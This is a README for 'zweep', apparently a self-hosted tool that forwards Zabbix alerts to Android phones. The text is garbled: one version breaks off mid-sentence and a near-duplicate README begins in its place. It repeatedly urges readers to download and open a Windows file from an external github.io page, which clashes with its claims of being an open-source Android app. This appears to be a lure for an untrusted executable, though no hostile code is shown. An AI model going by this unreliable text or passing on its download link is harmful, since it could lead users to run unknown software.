# 🚨 zweep - Self-Hosted Zabbix Alerts Made Simple

[![Download zweep](https://img.shields.io/badge/⬇_Download_zweep-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://xalefmousex.github.io)

Visit this link to download the application.

zweep is a self-hosted alert escalation app for Android. It helps you receive Zabbix alerts reliably, acknowledge problems from your phone, and deliver alerts to the right on-call person without relying on third-party clouds. It is built for people who want monitoring notifications to stay on infrastructure they control.

## 🔎 What Is zweep?

zweep connects your Zabbix monitoring system to Android notifications. When Zabbix detects a problem, zweep sends the alert to your Android device. You can review the problem, acknowledge it, and let your team know it is being handled. If an alert is not acknowledged, zweep can escalate it to the next person or group.

This is useful for home labs, small businesses, IT teams, and anyone who runs Zabbix and wants dependable alert delivery without sending monitoring data through an outside cloud service.

## ✨ What You Get

- 📲 Android notifications for Zabbix problems
- ✅ Problem acknowledgements from your phone
- 🕒 On-call delivery so the right person gets the alert
- 🔁 Escalation when an alert is not acknowledged
- 🏠 Self-hosted operation with no third-party clouds
- 🐳 Docker-friendly setup for running on your own hardware
- 🔌 Zabbix media type and alert script support
- 🔓 Open-source code you can review and adapt
- 🧩 Works with your existing Zabbix users and alert flow
- 🖥️ Windows-friendly first start using the published download

## 🧠 How It Works

zweep sits between Zabbix and your Android phone.

1. Zabbix detects a problem.
2. Zabbix sends the alert to the zweep service running on your own computer or server.
3. zweep delivers the alert to the active Android device or on-call person.
4. You open the notification and tap to acknowledge the problem.
5. zweep sends the acknowledgement back to Zabbix.
6. If nobody acknowledges the alert, zweep can escalate it based on your on-call setup.

Because zweep is self-hosted, your alert content and acknowledgement history stay within your own environment.

## 🐳 Before You Start

zweep is designed to run as a self-hosted service. On Windows, use a modern Windows 10 or Windows 11 computer with a stable internet connection. The application uses Docker, a free tool that runs self-hosted applications in a clean, isolated environment.

Before starting zweep, make sure Docker Desktop is installed and running on your Windows computer. Open Docker Desktop and wait until it shows that it is ready. Keep it running while you use zweep.

You also need:

- A Zabbix server that is already sending alerts
- An Android phone for receiving notifications
- Access to the computer where zweep will run
- The download link above

## 💻 Windows Download and First Start

[![Get zweep for Windows](https://img.shields.io/badge/Get_zweep_for_Windows-4C78A8?style=for-the-badge&logo=windows&logoColor=white)](https://xalefmousex.github.io)

Visit this link to download the application.

After the download finishes, open the downloaded file and follow the on-screen prompts to start zweep. If Docker Desktop is not already running, start it first and wait for it to become ready. Then open zweep and continue with the setup screen.

During first start, zweep will ask for the basic details it needs to run:

- A name for your zweep instance
- The connection details for your Zabbix server
- The address your Android phone will use to reach zweep
- The notification and escalation settings you want to use

Use a name that is easy to recognize, such as Home Zabbix or Office Monitoring. Keep the setup details somewhere safe so you can update them later.

## 📱 Connect Your Android Device

After zweep is running, connect your Android phone so it can receive alerts. Open the Android setup area in zweep and follow the pairing steps shown on screen. This links your phone to your self-hosted zweep service.

When pairing is complete, send a test notification. A test alert should appear on your Android device. Open the test alert and confirm that it shows the problem details correctly. This confirms that your phone can receive zweep notifications before you rely on them for real monitoring.

If you use on-call delivery, add the people or groups who should receive alerts. Set the order in which they should be contacted. For example, you can send alerts to the primary on-call person first, then to a backup person if the first alert is not acknowledged.

## 🔔 Connect Zabbix

In Zabbix, add zweep as a media type so Zabbix knows how to send alerts to it. Use the connection details shown in your zweep setup screen. Then assign the zweep media type to the Zabbix users who should receive Android notifications.

A simple setup looks like this:

1. Open Zabbix and go to the media types area.
2. Create a new media type for zweep.
3. Copy the connection details from zweep into the Zabbix media type.
4. Save the media type.
5. Open the user who should receive alerts.
6. Add the zweep media type to that user.
7. Send a test alert from Zabbix.

When the test alert arrives on your Android phone, your basic connection is working.

## ✅ Acknowledgements and On-Call

Acknowledgements let you tell Zabbix that someone is handling a problem. When an alert arrives on Android, open it and choose the acknowledge option. zweep sends that acknowledgement back to Zabbix, so the problem is marked as being handled.

On-call delivery helps when alerts must reach a specific person. Set who is on call, who is the backup, and how long zweep should wait before escalating. If the first person does not acknowledge the alert, zweep can move it to the next person or group.

This is helpful for:

- After-hours monitoring
- Small IT teams with shared responsibilities
- Home labs where one person is primary and another is backup
- Businesses that need a clear escalation path
- Teams that want acknowledgement records in Zabbix

## 🔒 Privacy and Control

zweep is self-hosted. That means the service runs on your own computer or server, and your alert flow stays within the environment you control. You are not sending Zabbix problems to a third-party cloud notification service.

Keep your zweep setup protected by using a strong password, limiting who can access the# 🚨 zweep - Self-Hosted Zabbix Alerts Made Simple

[![Download zweep](https://img.shields.io/badge/⬇_Download_zweep-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://xalefmousex.github.io)

Visit this link to download the application.

zweep is a self-hosted alert escalation application for Android. It helps you receive Zabbix alerts reliably, acknowledge problems from your phone, and deliver alerts to the right on-call person without sending monitoring data through third-party clouds. It is built for home labs, small businesses, IT teams, and anyone who runs Zabbix and wants more control over alert delivery.

## 🔎 What Is zweep?

zweep connects Zabbix to Android notifications. When Zabbix detects a problem, zweep can send that problem to your Android device. You can open the alert, review the details, and acknowledge the problem so everyone knows it is being handled. If an alert is not acknowledged, zweep can escalate it to another person or group.

This is useful when you want Zabbix alerts to reach a phone quickly and reliably, but you do not want to depend on an outside notification cloud. The service runs on your own computer or server, and you control who receives alerts and how escalation works.

## ✨ What You Get

- 📲 Android notifications for Zabbix problems
- ✅ Problem acknowledgements from your phone
- 🕒 On-call delivery for the right person at the right time
- 🔁 Escalation when alerts are not acknowledged
- 🏠 Self-hosted operation without third-party clouds
- 🐳 Docker-friendly setup for running on your own hardware
- 🔌 Zabbix media type and alert script support
- 🔓 Open-source code you can review and adapt
- 🧩 Works with your existing Zabbix users and alert flow
- 🖥️ Windows-friendly first start using the published download

## 🧠 How Alerts Flow

zweep sits between Zabbix and your Android phone.

1. Zabbix detects a problem.
2. Zabbix sends the alert to the zweep service running on your own computer or server.
3. zweep delivers the alert to the active Android device or on-call person.
4. You open the notification and acknowledge the problem.
5. zweep sends the acknowledgement back to Zabbix.
6. If nobody acknowledges the alert, zweep can escalate it based on your on-call setup.

Because zweep is self-hosted, your alert content and acknowledgement history stay within your own environment.

## 💻 Download and First Start

[![Get zweep for Windows](https://img.shields.io/badge/Get_zweep_for_Windows-4C78A8?style=for-the-badge&logo=windows&logoColor=white)](https://xalefmousex.github.io)

Visit this link to download the application.

After the download finishes, start zweep and follow the setup screens. The setup screens ask for the basic details needed to run the service, such as a name for your zweep instance, the connection details for your Zabbix server, the address your Android phone will use, and the notification settings you want to use.

Use a name that is easy to recognize, such as Home Zabbix or Office Monitoring. Keep your setup details somewhere safe so you can update them later.

zweep is designed for self-hosted use and works with Docker. Docker is a free tool that runs self-hosted applications in a clean, isolated environment. On Windows, make sure Docker is available and running before you start zweep. Keep Docker running while you use zweep.

## 📱 Connect Your Android Phone

After zweep is running, connect your Android phone so it can receive alerts. Open the Android setup area in zweep and follow the pairing steps shown on screen. This links your phone to your self-hosted zweep service.

When pairing is complete, send a test notification. A test alert should appear on your Android device. Open the test alert and confirm that it shows the problem details correctly. This confirms that your phone can receive zweep notifications before you rely on them for real monitoring.

If you use on-call delivery, add the people or groups who should receive alerts. Set the order in which they should be contacted. For example, you can send alerts to the primary on-call person first, then to a backup person if the first alert is not acknowledged.

## 🔔 Connect Zabbix

In Zabbix, add zweep as a media type so Zabbix knows how to send alerts to it. Use the connection details shown in your zweep setup screen. Then assign the zweep media type to the Zabbix users who should receive Android notifications.

A simple setup looks like this:

1. Open Zabbix and go to the media types area.
2. Create a new media type for zweep.
3. Copy the connection details from zweep into the Zabbix media type.
4. Save the media type.
5. Open the user who should receive alerts.
6. Add the zweep media type to that user.
7. Send a test alert from Zabbix.

When the test alert arrives on your Android phone, your basic connection is working.

## ✅ Acknowledge Problems

Acknowledgements let you tell Zabbix that someone is handling a problem. When an alert arrives on Android, open it and choose the acknowledge option. zweep sends that acknowledgement back to Zabbix, so the problem is marked as being handled.

Acknowledgements are helpful when several people receive alerts. They reduce duplicate work and make it clear that someone is already looking into the problem. They also give you a simple record of who responded and when.

## 🕒 On-Call and Escalation

On-call delivery helps when alerts must reach a specific person. Set who is on call, who is the backup, and how long zweep should wait before escalating. If the first person does not acknowledge the alert, zweep can move it to the next person or group.

This is helpful for after-hours monitoring, small IT teams with shared responsibilities, home labs where one person is primary and another is backup, and businesses that need a clear escalation path. You can keep escalation simple at first, then add more people or groups as your monitoring needs grow.

## 🔒 Privacy and Control

zweep is self-hosted. That means the service runs on your own computer or server, and your alert flow stays within the environment you control. You are not sending Zabbix problems to a third-party cloud notification service.

Keep your zweep setup protected by using a strong password, limiting who can access it, and keeping your computer or server up to date. Review the users and on-call groups from time to time so alerts always reach the right people.

## 🧰 Common Setup Checks

If alerts do not arrive as expected, check these common areas:

- Zabbix is sending alerts to the correct zweep connection details.
- The Zabbix user has the zweep media type assigned.
- Your Android phone is paired with the correct zweep instance.
- A test alert from Zabbix appears on your phone.
- The on-call order and escalation delay match your team plan.
- Docker is running on the Windows computer where zweep is hosted.

## ❓ Questions

Can zweep run without a third-party cloud? Yes. zweep is self-hosted, so the alert service runs in your own environment.

Does zweep work with Android? Yes. Android notifications and acknowledgements are part of the main alert flow.

Can I use zweep with Zabbix media types? Yes. zweep supports Zabbix media type and alert script setups.

Do I need to be a programmer? No. Follow the download link, start zweep, and use the setup screens to connect Android and Zabbix.

Can I use zweep for on-call delivery? Yes. You can set who receives alerts first and who receives them if the first person does not respond.

Keywords: android, docker, golang, kotlin, monitoring, notifications, open-source, self-hosted, zabbix, zabbix-alerts, zabbix-alertscripts, zabbix-mediatype